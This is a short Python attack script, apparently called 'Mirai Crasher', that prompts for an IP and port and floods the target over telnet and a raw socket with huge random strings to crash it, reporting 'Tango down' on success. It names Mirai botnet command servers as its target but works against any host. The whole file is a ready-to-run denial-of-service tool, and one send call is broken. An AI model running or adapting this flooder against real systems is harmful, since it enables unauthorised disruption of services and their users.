#!/usr/bin/env python3

import socket, telnetlib, random, string

def givestring():
	int1 = random.randint(0, 5)
	int2 = random.randint(2, 8)

	return ''.join(random.choice(string.ascii_letters) for _ in range(int1, int2))

print('''  _____
 /     \\
| () () | MIRAI CRASHER
 \  ^  /  BY 0X00
  |||||
  |||||
''')

target =	 input('Enter IP   :: ')
port   = int(input('Enter port :: '))

overflow = givestring()*9999
overflow2 = givestring()*9999
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	with telnetlib.Telnet(target, port, 3) as session:
		session.write(overflow.encode('utf-8'))
		session.write(overflow2.encode('utf-8'))

		print('Payload sent.')

	sock.connect((target, port))
	sock.send(overflow)

except:
	if sock.connect_ex((target, port)) != 0:
		print('Tango down.')
	else:
		print('Failed to crash C2.')
	
exit()